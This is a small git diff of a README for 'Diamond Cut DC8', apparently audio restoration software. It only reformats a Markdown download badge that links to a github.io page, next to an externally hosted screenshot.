@@ -1,6 +1,7 @@
 # Diamond Cut DC8
 
-[![Download](https://img.shields.io/badge/Download-DC8-blue?style=for-the-badge&logo=github)](https://diamond-cut-dc8.github.io/.github)
+[![Download](https://img.shields.io/badge/Download-DC8-blue?style=for-the-badge&logo=github)](https://diamond-cut-dc8.github.io/.github
+)
 
 ![Diamond Cut DC8 Screenshot](https://taiwebs.com/upload/images/upload-image-2/images/diamond-cut-audio-restoration-tools.jpg)
 
